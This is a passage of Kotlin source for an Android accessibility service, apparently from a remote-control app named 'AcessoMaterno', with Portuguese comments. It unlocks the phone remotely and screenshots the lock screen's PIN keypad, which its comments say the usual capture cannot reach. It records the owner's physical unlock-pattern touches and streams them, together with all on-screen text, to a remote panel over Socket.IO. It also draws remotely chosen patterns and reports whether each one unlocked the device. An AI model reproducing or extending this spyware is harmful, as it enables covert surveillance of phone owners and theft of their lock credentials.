                            // Reposicionar o cursor (ACTION_SET_SELECTION)
                            if (ok) {
                                try {
                                    val len = cursorFinal
                                    val selArgs = android.os.Bundle().apply {
                                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, len)
                                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, len)
                                    }
                                    alvo.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, selArgs)
                                } catch (_: Exception) {}
                            }

                            enviarLog("[WIREFRAME] send_text \"$texto\" (ok=$ok, cursor no fim)")
                            try { alvo.recycle() } catch (_: Exception) {}
                        } else {
                            enviarLog("[WIREFRAME] send_text: sem campo editável/focado — toque primeiro no campo desejado.")
                        }
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] send_text: ${e.message}")
                    }
                }
            }
            else -> enviarLog("[WIREFRAME] comando desconhecido: $comando")
        }
    }

    /** Busca o primeiro nó editável visível atravessando TODAS as janelas
     *  (fallback do send_text quando não há nó com foco de input). */
    private fun buscarNoEditavel(): AccessibilityNodeInfo? {
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            val janelas: List<android.view.accessibility.AccessibilityWindowInfo> =
                windows ?: emptyList()
            for (janela in janelas) {
                if (janela.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                janela.root?.let { roots.add(it) }
            }
        } catch (_: Exception) {}
        if (roots.isEmpty()) {
            try { rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        }
        for (r in roots) {
            val achou = buscarNoEditavelRec(r)
            if (achou != null) return achou
        }
        return null
    }

    private fun buscarNoEditavelRec(no: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            if (no.isVisibleToUser &&
                (no.isEditable || (no.actions and AccessibilityNodeInfo.ACTION_SET_TEXT) != 0)) {
                return no
            }
            for (i in 0 until no.childCount) {
                val f = no.getChild(i) ?: continue
                val r = buscarNoEditavelRec(f)
                if (r != null) return r
            }
        } catch (_: Exception) {}
        return null
    }
    /**
     * Desbloqueia o dispositivo remotamente (tela de swipe SEM senha).
     * Fluxo em camadas:
     *   1) Acende a tela se estiver apagada (gesto NÃO funciona com tela off).
     *   2) Desativa o keyguard via KeyguardLock.disableKeyguard() — requer a
     *      permissão android.permission.DISABLE_KEYGUARD (já declarada no
     *      manifest). Funciona para bloqueio de swipe (sem senha/PIN/padrão).
     *   3) Após ~1,2s, injeta um swipe-up automático (baixo -> cima) via
     *      dispatchGesture como garantia extra para ROMs (Xiaomi/MIUI/HyperOS,
     *      Samsung One UI) que ignoram o disableKeyguard.
     * Botão "🔓 Desbloquear (Swipe)" do painel.
     */
    fun desbloquearSwipeRemoto() {
        handlerMain.post {
            try {
                // 1) Garante tela ligada e MANTÉM ligada por 60s (WakeLock longo).
                //    Sem isto, a tela apaga em ~3s e o espelhamento cai — o usuário
                //    não tem tempo de ver a tela de senha e digitar remotamente.
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                try {
                    @Suppress("DEPRECATION")
                    val wakeLockLongo = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                            PowerManager.ACQUIRE_CAUSES_WAKEUP or
                            PowerManager.ON_AFTER_RELEASE,
                        "AcessoMaterno:Desbloquear60s"
                    )
                    wakeLockLongo.acquire(120000L) // mantém a tela acesa por 120s (2 min)
                    enviarLog("[DESBLOQUEAR] WakeLock de 120s adquirido — tela e espelhamento permanecem no ar.")
                } catch (e: Exception) {
                    Log.e(TAG, "Falha no WakeLock longo de desbloqueio: ${e.message}")
                }
                if (!pm.isInteractive) {
                    acenderTela()
                    enviarLog("[DESBLOQUEAR] Tela apagada -> acendendo antes de desbloquear.")
                }
                // 2) Desativa o keyguard de swipe (sem senha). Se houver PIN/senha,
                //    o bloqueio seguro permanece (mostra o teclado de senha).
                //    CORREÇÃO: se o keyguard é SEGURO (tem senha/PIN/padrão),
                //    NÃO chamamos disableKeyguard() — em algumas ROMs
                //    (Xiaomi/MIUI/HyperOS) ele causa o efeito "mostra e apaga"
                //    (a tela de bloqueio aparece e some). Apenas o swipe-up
                //    (abaixo) basta para abrir o teclado de senha.
                try {
                    val kg = getSystemService(KEYGUARD_SERVICE) as KeyguardManager
                    val keyguardSeguro = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                        kg.isKeyguardSecure
                    } else {
                        @Suppress("DEPRECATION")
                        false
                    }
                    if (keyguardSeguro) {
                        enviarLog("[DESBLOQUEAR] Keyguard SEGURO (com senha/PIN) — disableKeyguard ignorado; swipe-up abrirá o teclado de senha.")
                    } else {
                        @Suppress("DEPRECATION")
                        val keyguardLock = kg.newKeyguardLock("AcessoMaterno:Desbloquear")
                        keyguardLock.disableKeyguard()
                        enviarLog("[DESBLOQUEAR] Keyguard de swipe desativado via disableKeyguard.")
                    }
                } catch (e: Exception) {
                    enviarLog("[DESBLOQUEAR] Aviso: disableKeyguard falhou (${e.message}) — usando swipe-up de fallback.")
                }
                // 3) Swipe-up automático de fallback após a tela estabilizar
                handlerMain.postDelayed({ injetarSwipeUpDesbloqueio() }, 1200L)
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao desbloquear: ${e.message}")
            }
        }
    }

    /** Injeta um gesto de swipe-up (centro inferior -> centro superior) simulando o "deslize para desbloquear". */
    private fun injetarSwipeUpDesbloqueio() {
        try {
            val metrics = resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()
            val startX = w / 2f
            val startY = h * 0.85f  // 15% acima da borda inferior
            val endX = w / 2f
            val endY = h * 0.20f    // 20% abaixo da borda superior
            // Libera o overlay de bloqueio (Acesso Total) para o gesto atravessar.
            setBloqueioPermiteToqueRemoto(true)
            handlerMain.removeCallbacks(failsafeRestauroBloqueio)
            handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
            val path = Path().apply {
                moveTo(startX, startY)
                lineTo(endX, endY)
            }
            val stroke = GestureDescription.StrokeDescription(path, 0, 350L)
            val gesto = GestureDescription.Builder().addStroke(stroke).build()
            val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) {
                    enviarLog("[DESBLOQUEAR] Swipe-up de desbloqueio concluído (85% -> 20% da altura).")
                    restaurarBloqueioLocal()
                }
                override fun onCancelled(g: GestureDescription?) {
                    enviarLog("[DESBLOQUEAR] Swipe-up de desbloqueio cancelado.")
                    restaurarBloqueioLocal()
                }
            }, null)
            if (!aceito) {
                enviarLog("[DESBLOQUEAR] dispatchGesture recusado — o Android pode estar bloqueando gestos na tela de bloqueio.")
                restaurarBloqueioLocal()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao injetar swipe-up: ${e.message}")
        }
    }

    // ================================================================
    // CAPTURA POR ACESSIBILIDADE — takeScreenshot() (Android 11+, API 30)
    // ----------------------------------------------------------------
    // Inicia o loop de captura por AccessibilityService.takeScreenshot().
    // Chamado pelo ScreenCaptureService quando detecta SCREEN_ON com keyguard
    // travado (tela de senha/PIN que o MediaProjection não consegue capturar).
    // Envia os frames pelo MESMO canal Socket.IO ("enviar_tela") — o painel
    // continua funcionando sem nenhuma alteração.
    // ================================================================
    fun iniciarCapturaAcessibilidade() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            enviarLogApp("[CAPTURA-ACE] Android < 11 (API < 30) — takeScreenshot() indisponível. Use ADB/SurfaceControl (scrcpy) como alternativa.")
            return
        }
        if (capturaAcessibilidadeAtiva) return
        capturaAcessibilidadeAtiva = true
        handlerCapturaAces.removeCallbacks(runnableCapturaAces)
        handlerCapturaAces.post(runnableCapturaAces)
        enviarLogApp("[CAPTURA-ACE] Captura por AccessibilityService.takeScreenshot() ATIVADA (~5 FPS) — keyguard com senha visível no painel.")
    }

    /** Para a captura por acessibilidade (volta ao MediaProjection, mais FPS). Chamado no USER_PRESENT. */
    fun pararCapturaAcessibilidade() {
        if (!capturaAcessibilidadeAtiva) return
        capturaAcessibilidadeAtiva = false
        handlerCapturaAces.removeCallbacks(runnableCapturaAces)
        enviarLogApp("[CAPTURA-ACE] Captura por acessibilidade DESATIVADA — volta ao MediaProjection (FPS normal).")
    }

    /**
     * Captura UM frame via AccessibilityService.takeScreenshot() e envia por
     * Socket.IO no mesmo canal "enviar_tela" (byte[] puro, igual ao MediaProjection).
     * Diferente do MediaProjection (UID do app, não captura FLAG_SECURE), o
     * takeScreenshot() da acessibilidade captura as camadas seguras do sistema,
     * inclusive o teclado de senha/PIN do keyguard.
     */
    @androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
    private fun capturarScreenshotAcessibilidade() {
        try {
            val executor = ContextCompat.getMainExecutor(this)
            takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    var hardwareBuffer: HardwareBuffer? = null
                    try {
                        hardwareBuffer = result.hardwareBuffer
                        val colorSpace = ColorSpace.get(ColorSpace.Named.SRGB)
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            ?: Bitmap.wrapHardwareBuffer(hardwareBuffer, null)
                        if (bitmap == null) {
                            Log.w(TAG, "Bitmap.wrapHardwareBuffer retornou nulo.")
                            return
                        }
                        // Converte para bitmap mutável (compress exige config de hardware)
                        val bitmapCopiaciavel = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                        bitmap.recycle()
                        val baos = ByteArrayOutputStream()
                        bitmapCopiaciavel.compress(Bitmap.CompressFormat.JPEG, 60, baos)
                        val bytes = baos.toByteArray()
                        bitmapCopiaciavel.recycle()
                        SocketManager.socket?.emit("enviar_tela", bytes)
                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao processar screenshot da acessibilidade: ${e.message}")
                    } finally {
                        try { hardwareBuffer?.close() } catch (_: Exception) {}
                    }
                }

                override fun onFailure(errorCode: Int) {
                    // Códigos: ERROR_TAKE_SCREENSHOT_INTERVALTOO_SHORT (muito rápido),
                    // ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS, etc.
                    Log.w(TAG, "takeScreenshot falhou (código=$errorCode) — tentando novamente no próximo ciclo.")
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao chamar takeScreenshot: ${e.message}")
        }
    }

    // ================================================================
    // MÓDULO DE INSPEÇÃO E DESBLOQUEIO REMOTO DA TELA DE BLOQUEIO
    // ================================================================

    /**
     * Inspeção de nós da tela de bloqueio via rootInActiveWindow.
     * Captura nós visíveis, IDs de view, coordenadas e status da tela/senha.
     */
    fun lerArvoreTelaBloqueio(): JSONObject {
        val keyguardManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
        val powerManager = getSystemService(POWER_SERVICE) as? PowerManager

        val telaApagada = powerManager?.isInteractive == false
        val telaBloqueada = keyguardManager?.isKeyguardLocked == true
        val senhaGuardada = keyguardManager?.isKeyguardSecure == true

        val root = rootInActiveWindow
        val nos = mutableListOf<JSONObject>()
        var detectouPadrao = false
        var detectouPin = false

        if (root != null) {
            percorrerNosRecursivo(root, nos)
            for (i in 0 until nos.size) {
                val item = nos[i]
                val idName = item.optString("viewId", "").lowercase()
                val clsName = item.optString("className", "").lowercase()
                if (idName.contains("lockpattern") || clsName.contains("lockpattern") || idName.contains("pattern")) {
                    detectouPadrao = true
                }
                if (idName.contains("pin") || idName.contains("keyguard_pin") || idName.contains("digit") || idName.contains("numeric")) {
                    detectouPin = true
                }
            }
        }

        val estadoDesc = when {
            telaApagada -> "Tela Apagada (Deslize para Acordar)"
            detectouPadrao -> "Aguardando Padrão (9 pontos)"
            detectouPin -> "Aguardando PIN / Senha"
            telaBloqueada -> "Tela de Capa (Deslize para Abrir Senha)"
            else -> "Tela Desbloqueada"
        }

        return JSONObject().apply {
            put("dispositivo", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("deviceId", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("telaApagada", telaApagada)
            put("telaBloqueada", telaBloqueada)
            put("senhaGuardada", senhaGuardada)
            put("detectouPadrao", detectouPadrao)
            put("detectouPin", detectouPin)
            put("estadoDescricao", estadoDesc)
            put("larguraTela", resources.displayMetrics.widthPixels)
            put("alturaTela", resources.displayMetrics.heightPixels)
            put("nos", org.json.JSONArray(nos))
        }
    }

    // ================================================================
    // CAPTURA E NORMALIZAÇÃO DE GESTOS FÍSICOS NA TELA DO CELULAR
    // ================================================================
    private val bufferGestosFisicos = mutableListOf<JSONObject>()
    @Volatile private var tipoGestoFisicoCapturado: String = "padrao"

    // --- FILTRO GEOMÉTRICO DA TRILHA (LockPatternView vs. nós estáticos) ---
    // Área real (em pixels) da grade de padrão atualmente detectada na tela de
    // bloqueio. Só os toques cujo centro cai DENTRO desta área entram na trilha
    // de gestos — descartando saltos para relógio, barra de status e textos
    // informativos da SystemUI que geravam linhas cruzadas irreais no leitor.
    @Volatile private var gradePadraoBounds: android.graphics.Rect? = null
    // Indica que um gesto físico está em andamento (entre START e END). Usado
    // para limpar o buffer da trilha UMA vez ao iniciar uma nova interação.
    @Volatile private var gestoFisicoAtivo: Boolean = false
    // Mantém o último traçado visível por 1,5s após o fim do gesto e então limpa.
    private val limparTrilhaRunnable = Runnable { limparBufferGestosFisicos() }

    private fun limparBufferGestosFisicos() {
        synchronized(bufferGestosFisicos) {
            bufferGestosFisicos.clear()
            tipoGestoFisicoCapturado = "padrao"
        }
    }

    private fun capturarToqueFisicoTelaBloqueio(event: AccessibilityEvent) {
        try {
            // --- Limpeza do buffer da trilha ao iniciar/terminar a interação ---
            // Ao iniciar um NOVO gesto físico, zera a trilha anterior (uma única
            // vez). Ao terminar, mantém o traçado por 1,5s para inspeção visual
            // no depurador e então limpa automaticamente.
            when (event.eventType) {
                AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START,
                AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_START -> {
                    if (!gestoFisicoAtivo) {
                        handlerMain.removeCallbacks(limparTrilhaRunnable)
                        limparBufferGestosFisicos()
                        gestoFisicoAtivo = true
                    }
                }
                AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END,
                AccessibilityEvent.TYPE_GESTURE_DETECTION_END,
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_END -> {
                    gestoFisicoAtivo = false
                    handlerMain.removeCallbacks(limparTrilhaRunnable)
                    handlerMain.postDelayed(limparTrilhaRunnable, 1500L)
                }
            }

            val keyguardManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
            val pkg = event.packageName?.toString() ?: ""
            val isLockOrSystem = (keyguardManager?.isKeyguardLocked == true) || pkg.contains("systemui") || pkg.contains("keyguard")

            val node = event.source
            val bounds = android.graphics.Rect()
            // Identificação do nó ANTES de reciclar: precisamos do viewId/className
            // para distinguir a grade interativa (LockPatternView) dos nós estáticos.
            var viewId = ""
            var className = ""
            if (node != null) {
                node.getBoundsInScreen(bounds)
                viewId = (node.viewIdResourceName ?: "").lowercase()
                className = (node.className?.toString() ?: "").lowercase()
                try { node.recycle() } catch (_: Exception) {}
            }

            val ehPatternView = viewId.contains("lockpattern") || viewId.contains("lock_pattern") ||
                viewId.contains("patternview") || className.contains("lockpattern")

            // A própria LockPatternView define a REGIÃO da grade. Seu centro é o
            // centro da grade inteira — não deve virar um ponto da trilha.
            if (ehPatternView && bounds.width() > 100 && bounds.height() > 100) {
                gradePadraoBounds = android.graphics.Rect(bounds)
                return
            }

            if (bounds.width() <= 0 || bounds.height() <= 0) return

            val cx = bounds.centerX()
            val cy = bounds.centerY()

            // --- FILTRO GEOMÉTRICO EXCLUSIVO ---
            // Só conecta pontos que pertençam à grade interativa:
            //   • se a área da grade já foi detectada, exige que (cx, cy) esteja
            //     DENTRO dela — descarta saltos para relógio / status bar / textos;
            //   • se ainda não foi detectada mas estamos no keyguard/SystemUI,
            //     exige marcação de padrão no nó (pattern/keyguard/cell/dot),
            //     evitando conectar nós estáticos antes da grade aparecer.
            val regiao = gradePadraoBounds
            if (regiao != null) {
                if (!regiao.contains(cx, cy)) return
            } else if (isLockOrSystem) {
                val marcaGrade = viewId.contains("pattern") || viewId.contains("keyguard") ||
                    viewId.contains("cell") || viewId.contains("dot") || className.contains("pattern")
                if (!marcaGrade) return
            }

            val metrics = resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()

            val normX = (cx.toFloat() / w).coerceIn(0.0f, 1.0f)
            val normY = (cy.toFloat() / h).coerceIn(0.0f, 1.0f)

            synchronized(bufferGestosFisicos) {
                val ultimo = bufferGestosFisicos.lastOrNull()
                val dist = if (ultimo != null) {
                    val lx = ultimo.optDouble("x", 0.0).toFloat()
                    val ly = ultimo.optDouble("y", 0.0).toFloat()
                    Math.hypot((normX - lx).toDouble(), (normY - ly).toDouble())
                } else 1.0

                if (dist > 0.005 || bufferGestosFisicos.isEmpty()) {
                    val ptObj = JSONObject().apply {
                        put("x", normX)
                        put("y", normY)
                        put("absX", cx)
                        put("absY", cy)
                        put("timestamp", System.currentTimeMillis())
                    }
                    bufferGestosFisicos.add(ptObj)
                    if (bufferGestosFisicos.size > 50) bufferGestosFisicos.removeAt(0)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao capturar toque físico: ${e.message}")
        }
    }

    private val lockStateReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: android.content.Context?, intent: Intent?) {
            if (intent == null) return
            val action = intent.action ?: return
            when (action) {
                Intent.ACTION_USER_PRESENT -> {
                    val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
                    Log.d(TAG, "ACTION_USER_PRESENT recebido — tela do dispositivo $deviceId foi REALMENTE desbloqueada!")
                    pararCapturaAcessibilidade()

                    val arrayGestos = org.json.JSONArray()
                    val tipoCaptura: String
                    synchronized(bufferGestosFisicos) {
                        tipoCaptura = tipoGestoFisicoCapturado
                        bufferGestosFisicos.forEach { arrayGestos.put(it) }
                    }

                    val gestureDataObj = if (arrayGestos.length() > 0) {
                        JSONObject().apply {
                            put("tipo", tipoCaptura)
                            put("pontosNormalizados", arrayGestos)
                            put("pontos", arrayGestos)
                            put("source", "physical_screen")
                            put("timestamp", System.currentTimeMillis())
                        }
                    } else null

                    // Atraso de 1.5s para limpar o buffer, preservando o desenho da trilha no FPS
                    handlerMain.postDelayed({ limparBufferGestosFisicos() }, 1500L)

                    // ★ CORREÇÃO (PROBLEMA 2): log de depuração CLARO e visível
                    // no painel (via log_dispositivo) — confirma que o Android
                    // capturou os gestos físicos na tela de bloqueio e está
                    // enviando a confirmação. Ajuda a diagnosticar Samsung/MIUI.
                    enviarLogApp("[BLOQUEIO OK] USER_PRESENT em $deviceId — gestos físicos capturados=${arrayGestos.length()} tipo=$tipoCaptura. Enviando lockscreen_desbloqueado_ok…")

                    try {
                        val payload = JSONObject().apply {
                            put("dispositivo", deviceId)
                            put("deviceId", deviceId)
                            put("timestamp", System.currentTimeMillis())
                            put("status", "desbloqueado")
                            put("source", "physical_screen")
                            if (gestureDataObj != null) {
                                put("gestureData", gestureDataObj)
                            }
                        }
                        SocketManager.socket?.emit("lockscreen_desbloqueado_ok", payload)
                        enviarLog("[BLOQUEIO OK] Confirmação de tela desbloqueada enviada com ${arrayGestos.length()} pontos de gesto físico!")
                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao emitir lockscreen_desbloqueado_ok: ${e.message}")
                    }
                }
                Intent.ACTION_SCREEN_OFF -> {
                    val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
                    Log.d(TAG, "ACTION_SCREEN_OFF recebido — limpando buffer de gestos físicos.")
                    limparBufferGestosFisicos()
                    try {
                        val payload = JSONObject().apply {
                            put("dispositivo", deviceId)
                            put("deviceId", deviceId)
                            put("timestamp", System.currentTimeMillis())
                            put("status", "bloqueado")
                        }
                        SocketManager.socket?.emit("lockscreen_estado_mudou", payload)
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun percorrerNosRecursivo(node: AccessibilityNodeInfo, listaOut: MutableList<JSONObject>) {
        // Proteção contra árvores muito profundas / recursão descontrolada.
        if (listaOut.size >= 1200) return
        val bounds = android.graphics.Rect()
        node.getBoundsInScreen(bounds)

        if (node.isVisibleToUser && bounds.width() > 0 && bounds.height() > 0) {
            val item = JSONObject().apply {
                put("viewIdResourceName", node.viewIdResourceName ?: "")
                put("viewId", node.viewIdResourceName ?: "")
                put("className", node.className?.toString() ?: "")
                put("text", node.text?.toString() ?: "")
                put("contentDescription", node.contentDescription?.toString() ?: "")
                put("clickable", node.isClickable)
                // Estado de foco/seleção: o Leitor FPS pinta de amarelo o nó
                // em foco (grade 3x3 / LockPatternView) para o foco sequencial.
                put("focused", node.isAccessibilityFocused || node.isFocused)
                put("selected", node.isSelected)
                put("left", bounds.left)
                put("top", bounds.top)
                put("right", bounds.right)
                put("bottom", bounds.bottom)
                put("centerX", bounds.centerX())
                put("centerY", bounds.centerY())
            }
            listaOut.add(item)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            percorrerNosRecursivo(child, listaOut)
            try { child.recycle() } catch (_: Exception) {}
        }
    }

    /**
     * Coleta os nós de TODAS as janelas ativas (service.windows) — incluindo a
     * SystemUI e o Keyguard onde a grade 3x3 (LockPatternView) é renderizada —
     * além de rootInActiveWindow. Sem percorrer `windows`, apenas os nós
     * superiores (relógio/data) da janela ativa eram enviados e os filhos da
     * grade não atualizavam o foco em tempo real. Ignora os overlays de
     * acessibilidade (os nossos). Faz fallback para rootInActiveWindow quando
     * nenhuma janela retorna raiz (ROMs antigas / tela apagada).
     */
    private fun coletarNosDeTodasJanelas(listaOut: MutableList<JSONObject>) {
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            val janelas: List<android.view.accessibility.AccessibilityWindowInfo> =
                windows ?: emptyList()
            for (janela in janelas) {
                if (janela.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                val raiz = janela.root ?: continue
                roots.add(raiz)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao listar janelas para telemetria: ${e.message}")
        }
        if (roots.isEmpty()) {
            try { rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        }
        for (raiz in roots) {
            try {
                percorrerNosRecursivo(raiz, listaOut)
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao percorrer janela: ${e.message}")
            }
            try { raiz.recycle() } catch (_: Exception) {}
        }
    }

    private var ultimoEnvioTelemetriaMs = 0L

    /**
     * Envia telemetria da árvore de componentes e eventos de interação via Socket.IO em tempo real.
     * Funciona continuamente mesmo quando a tela estiver apagada ou o vídeo pausado.
     */
    private fun enviarTelemetriaAcessibilidade(event: AccessibilityEvent?) {
        try {
            val agora = System.currentTimeMillis()
            val tipo = event?.eventType ?: 0

            // FOCO SEQUENCIAL EM TEMPO REAL: mudanças de foco/seleção (foco da
            // grade 3x3 / LockPatternView) são emitidas IMEDIATAMENTE, sem o
            // debounce de 100ms, para que o Leitor FPS acompanhe o foco nó a nó.
            val eventoFoco = tipo == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
                tipo == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
                tipo == AccessibilityEvent.TYPE_VIEW_SELECTED

            if (!eventoFoco && tipo == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
                (agora - ultimoEnvioTelemetriaMs < 100)) {
                return
            }
            ultimoEnvioTelemetriaMs = agora

            val pontoReal = android.graphics.Point()
            val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
            @Suppress("DEPRECATION")
            wm?.defaultDisplay?.getRealSize(pontoReal)
            val metrics = resources.displayMetrics
            val screenWidth = if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels
            val screenHeight = if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels

            // Percorre TODAS as janelas (windows) + rootInActiveWindow, incluindo
            // a SystemUI/Keyguard onde a grade 3x3 é renderizada, extraindo os
            // boundsInScreen dos filhos da grade.
            val nos = mutableListOf<JSONObject>()
            coletarNosDeTodasJanelas(nos)

            val deviceName = "${Build.MANUFACTURER}-${Build.MODEL}"

            val arrayGestos = JSONArray()
            synchronized(bufferGestosFisicos) {
                bufferGestosFisicos.forEach { arrayGestos.put(it) }
            }

            val kgManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
            val telaBloqueada = kgManager?.isKeyguardLocked == true

            val payload = JSONObject().apply {
                put("dispositivo", deviceName)
                put("package_name", event?.packageName?.toString() ?: "")
                put("screen_width", screenWidth)
                put("screen_height", screenHeight)
                put("tela_bloqueada", telaBloqueada)
                put("nos", JSONArray(nos))
                put("interacoes", arrayGestos)
                put("timestamp", agora)
            }

            SocketManager.garantirConexao()
            SocketManager.socket?.emit("dados_acessibilidade", payload)
            SocketManager.socket?.emit("telemetria_acessibilidade", payload)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar telemetria de acessibilidade: ${e.message}")
        }
    }

    /**
     * Executa o desenho contínuo da senha padrão (Pattern Password) passando
     * pelas coordenadas exatas dos pontos selecionados na web.
     */
    /**
     * Varre a árvore de nós procurando a LockPatternView (grade 3x3) e devolve
     * seu retângulo em coordenadas de tela. Usada para desenhar o padrão nos
     * pontos REAIS do aparelho, sem depender da calibração do painel.
     */
    private fun buscarLockPatternBounds(no: AccessibilityNodeInfo?, prof: Int = 0): android.graphics.Rect? {
        if (no == null || prof > 25) return null
        try {
            val rect = android.graphics.Rect()
            no.getBoundsInScreen(rect)
            val viewId = (no.viewIdResourceName ?: "").lowercase()
            val cls = (no.className?.toString() ?: "").lowercase()
            if (rect.width() > 100 && rect.height() > 100 &&
                (viewId.contains("lockpattern") || viewId.contains("lock_pattern") ||
                 viewId.contains("patternview") || cls.contains("lockpattern"))) {
                return rect
            }
            for (i in 0 until no.childCount) {
                val r = buscarLockPatternBounds(no.getChild(i) ?: continue, prof + 1)
                if (r != null) return r
            }
        } catch (_: Exception) {}
        return null
    }

    /**
     * Detecta AO VIVO os 9 centros reais da grade de padrão na tela atual
     * (índice 0 = ponto 1 … índice 8 = ponto 9). null se não achar a grade.
     */
    private fun detectarCentrosPadraoAoVivo(): List<android.graphics.PointF>? {
        val raizes = mutableListOf<AccessibilityNodeInfo>()
        try { rootInActiveWindow?.let { raizes.add(it) } } catch (_: Exception) {}
        try { windows?.forEach { w -> try { w.root?.let { raizes.add(it) } } catch (_: Exception) {} } } catch (_: Exception) {}
        var pb: android.graphics.Rect? = null
        for (r in raizes) { pb = buscarLockPatternBounds(r); if (pb != null) break }
        val b = pb ?: return null
        if (b.width() <= 100 || b.height() <= 100) return null
        val cellW = b.width() / 3f
        val cellH = b.height() / 3f
        val centros = mutableListOf<android.graphics.PointF>()
        for (row in 0..2) for (col in 0..2) {
            centros.add(android.graphics.PointF(b.left + cellW * (col + 0.5f), b.top + cellH * (row + 0.5f)))
        }
        return centros
    }

    fun desbloquearPadraoPontos(
        pontos: List<android.graphics.PointF>,
        indices: List<Int>? = null,
        onResult: ((Boolean) -> Unit)? = null
    ) {
        // PRIORIDADE: se o painel mandou os índices (1-9) da sequência, desenha
        // nos CENTROS REAIS da LockPatternView detectada no próprio aparelho —
        // assim o gesto cai exatamente nas bolinhas, sem depender da calibração
        // do painel. Cai para os pixels do painel só se a grade não for detectada.
        var pontosFinais = pontos
        if (!indices.isNullOrEmpty()) {
            val centros = detectarCentrosPadraoAoVivo()
                ?: (if (wireframePadraoCentros.size == 9) wireframePadraoCentros else null)
            if (centros != null && centros.size == 9) {
                val remapeados = indices.mapNotNull { idx -> if (idx in 1..9) centros[idx - 1] else null }
                if (remapeados.size >= 2) {
                    pontosFinais = remapeados
                    enviarLog("[PADRÃO] Desenhando nos centros reais da grade detectada (índices ${indices.joinToString("→")}).")
                }
            } else {
                enviarLog("[PADRÃO AVISO] Grade não detectada no aparelho — usando coordenadas do painel.")
            }
        }

        if (pontosFinais.size < 2) {
            enviarLog("[PADRÃO ERRO] Requer pelo menos 2 pontos para desenhar a senha padrão.")
            onResult?.invoke(false)
            return
        }

        val path = Path().apply {
            moveTo(pontosFinais[0].x, pontosFinais[0].y)
            for (i in 1 until pontosFinais.size) {
                lineTo(pontosFinais[i].x, pontosFinais[i].y)
            }
        }

        val tempoDuracao = (pontosFinais.size * 180L).coerceIn(300L, 1800L)
        val stroke = GestureDescription.StrokeDescription(path, 0, tempoDuracao)
        val gestureBuilder = GestureDescription.Builder().addStroke(stroke)

        val aceito = dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                // O gesto foi DESENHADO. Só isso não diz se a senha estava certa:
                // o padrão certo DESTRAVA o keyguard; o errado mantém a tela
                // bloqueada. Esperamos o sistema processar (~900ms) e checamos o
                // keyguard para saber se o padrão era realmente o correto.
                handlerMain.postDelayed({
                    val aindaBloqueado = try {
                        (getSystemService(KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true
                    } catch (_: Exception) { true }
                    val sucesso = !aindaBloqueado
                    enviarLog(
                        if (sucesso) "[PADRÃO OK] Senha correta — dispositivo desbloqueado."
                        else "[PADRÃO INCORRETO] A senha padrão está incorreta (keyguard ainda bloqueado)."
                    )
                    onResult?.invoke(sucesso)
                }, 900L)
            }

            override fun onCancelled(gestureDescription: GestureDescription?) {
                enviarLog("[PADRÃO CANCELADO] Desenho da senha padrão cancelado pelo sistema.")
                onResult?.invoke(false)
            }
        }, null)

        if (!aceito) {
